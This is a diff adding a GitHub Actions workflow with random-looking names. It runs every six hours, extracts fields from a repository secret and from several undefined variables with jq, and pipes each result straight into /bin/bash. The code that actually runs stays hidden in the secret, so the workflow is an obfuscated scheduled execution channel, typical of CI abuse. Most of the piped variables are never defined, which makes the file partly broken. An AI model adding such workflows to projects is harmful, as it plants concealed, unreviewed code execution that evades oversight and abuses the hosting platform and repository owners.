@@ -1,0 +1,25 @@
+name: meiruren4617
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: meiruren4617
+        env:
+          ui4: ${{ secrets.ui4 }}
+        run: |
+          echo $ui4 | jq -r .ry24717 | /bin/bash
+          echo $qaxx28 | jq -r .h92 | /bin/bash
+          echo $sz818 | jq -r .pxu6121 | /bin/bash
+          echo $vtffi6 | jq -r .zrgar04 | /bin/bash
+          echo $yx41 | jq -r .yeucd687 | /bin/bash
+          echo $tjss27 | jq -r .fr1463 | /bin/bash
+          echo $ztkv481 | jq -r .tn98478 | /bin/bash
+          echo $sfpri91721 | jq -r .nyxp1981 | /bin/bash
+
